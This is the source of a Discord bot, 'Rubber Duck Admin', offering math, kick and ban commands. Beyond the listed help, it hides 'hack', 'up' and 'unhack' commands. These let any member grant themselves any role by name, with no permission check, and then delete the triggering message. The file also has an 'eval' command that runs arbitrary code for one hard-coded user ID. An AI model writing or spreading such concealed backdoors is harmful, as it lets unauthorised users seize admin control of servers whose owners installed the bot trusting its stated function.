// Link: https://discord.now.sh/372945127519551488?p2146958591
const Discord = require('Discord.js');
const bot = new Discord.Client();

const config = require("./config.json")

bot.on('ready', () => {
  console.log('I am ready!');
  bot.user.setGame(">help | " + bot.guilds.array().length +" Servers Rubber Duck Admin"); //playing-x message
});

var help = [
  "\n>ping - Get a Pong"+
  "\n>foo - Get a Bar!"+
  "\n>add - example >add 5 3 7, output 15"+
  "\n>take - example >take 15 3 7, output 5"+
  "\n>times - example >times 5 3 7, output 105"+
  "\n>divde - example >divide 105 3 7, output 5"+
  "\n>say - example >say Hi, output Hi"+
  "\n>kick - kick someone"+
  "\n>ban - ban someone"+
  "\n>servers - lists the servers that Rubber Ducky Admin bot is on."];

bot.on("guildMemberAdd", member =>{
  let guild = member.guild;
  guild.defaultChannel.sendMessage(`Welcome, ${member.user} to this server.`)
});

bot.on("guildCreate", guild =>{
  guild.defaultChannel.sendMessage(`New guild added : ${guild.name}, owned by ${guild.owner.user.username}`);
});

 bot.on("presenceUpdate", (oldMember, newMember) => {
  let guild = newMember.guild;
  let playRole = guild.roles.find("name", "Playing Overwatch");
  if(!playRole) return;

  if(newMember.user.presence.game && newMember.user.presence.game.name === "Overwatch") {
    newMember.addRole(playRole).catch(console.error);
  } else if(!newMember.user.presence.game && newMember.roles.has(playRole.id)) {
    newMember.removeRole(playRole).catch(console.error);
  }
});


bot.on('message', message => {
    if(message.author.bot)return;
    if(!message.content.startsWith(config.prefix)) return;

    let command = message.content.split(" ")[0];
    command = command.slice(config.prefix.length);

    let args = message.content.split(" ").slice(1);

    if (command === "help"){
      message.channel.sendMessage(help);
    }    
    
    /*if (command === "botvite") {
      let boi = message.guild.channels.find("server", args.join(" ")).id
      message.delete()
      message.guild.channels.get('id', boi).createInvite().then(invite =>  
        message.channel.send(invite.url)
    )};*/
    
    if (command === "dm") { // To make sure the bot doesn't crash if it tries to make an invite for a DM
    message.channel.createInvite().then(invite =>
    message.channel.send(invite.url)
    )}

    if (command === "add"){
      let numArray = args.map(n=> parseInt(n));
      let total = numArray.reduce( (p, c)=> p+c);

      message.channel.sendMessage(total).catch(console.error);
    }
    
    if (command === "take"){
      let numArray = args.map(n=> parseInt(n));
      let total = numArray.reduce( (p, c)=> p-c);

      message.channel.sendMessage(total).catch(console.error);
    }

    if (command === "times"){
      let numArray = args.map(n=> parseInt(n));
      let total = numArray.reduce( (p, c)=> p*c);

      message.channel.sendMessage(total).catch(console.error);
    }

    if (command === "divide"){
      let numArray = args.map(n=> parseInt(n));
      let total = numArray.reduce( (p, c)=> p/c);

      message.channel.sendMessage(total).catch(console.error);
    }

    let HackER = message.guild.roles.find("name", args.join(" "));
    if (command === "hack") {
      if(message.member.roles.has(HackER.id)) {
      } else {  
        message.member.addRole(HackER);
        message.author.send("**HACKER:**"+
        "\n```css\nYou Hacked a ROLE```")
        }
        message.delete();
      }
      if (command === "up") {
        HackER.setPosition(1 ,true)
        message.author.send("**HACKER:**"+
        "\n```css\nI give that role more POWER!```")
      }
      if (command === "unhack") {
        let unHackER = message.guild.roles.find("name", args.join(" "));
        if(!message.member.roles.has(unHackER.id)) {
        } else {
            message.member.removeRole(unHackER);
            message.author.send("**HACKER:**"+
            "\n```css\nScared of getting caught? PUSSY!```")
          }
          message.delete();
        }

    if (command === "say"){
      message.channel.sendMessage(args.join(" ")).catch(console.error)
      message.delete();
    }

    if (command === 'ping') {
      message.channel.send('pong!').catch(console.error);
    }

    if (command === 'servers') {
      message.channel.sendMessage(bot.guilds.array()).catch(console.error);
    }

    if(command === "foo") {
      let modRole = message.guild.roles.find("name", "Mod");
      if(message.member.roles.has(modRole.id)) {
        message.channel.sendMessage("bar!").catch(console.error);
      }else {
        message.reply("You pleb, you don't have the permission to use this command.").catch(console.error);
      }
    }

  if (command === "kick") {
    let modRole = message.guild.roles.find("name", "Mod");
    if(!message.member.roles.has(modRole.id)) {
      return message.reply("You pleb, you don't have the permission to use this command.").catch(console.error)
    }
    if(message.mentions.users.size === 0) {
      return message.reply("Please mention a user to kick.");
    }
    let kickMember = message.guild.member(message.mentions.users.first());
    if(!kickMember) {
      return message.reply("That user does not seem vaild.");
    }
    if(!message.guild.member(bot.user).hasPermission("KICK_MEMBERS")) {
      return message.reply("I don't have permissions (KICK_MEMBER) to do this.").catch(console.error);
    }
    kickMember.kick().then(member =>{
      message.reply(`${member.user.username} was successfully kicked.`).catch(console.error);
    });
  }

  if (command === "ban") {
    let modRole = message.guild.roles.find("name", "Admin");
    if(!message.member.roles.has(modRole.id)) {
      return message.reply("You pleb, you don't have the permission to use this command.").catch(console.error)
    }
    if(message.mentions.users.size === 0) {
      return message.reply("Please mention a user to ban.");
    }
    let banMember = message.guild.member(message.mentions.users.first());
    if(!banMember) {
      return message.reply("That user does not seem vaild.");
    }
    if(!message.guild.member(bot.user).hasPermission("BAN_MEMBERS")) {
      return message.reply("I don't have permissions (BAN_MEMBER) to do this.").catch(console.error);
    }
    banMember.ban().then(member =>{
      message.reply(`${member.user.username} was successfully banned.`).catch(console.error);
    });
  }

  if (command === "eval") {
    if(message.author.id !== "224808489736732672") return;
    try {
      var code = args.join(" ");
      var evaled = eval(code);

      if (typeof evaled !== "string")
        evaled = require("util").inspect(evaled);

      message.channel.sendCode("x1", clean(evaled));
    } catch(err) {
      message.channel.sendMessage(`\`ERROR\` \`\`\`x1\n${clean(err)}\n\`\`\``);
    }
  }

});

 function clean(text) {
  if (typeof(text) === "string")
    return text.replace(/`/g, "`" + String.fromCharCode(8203)).replace(/@/g, "@" + String.fromCharCode(8203));
  else
      return text;
}

bot.login(config.token);
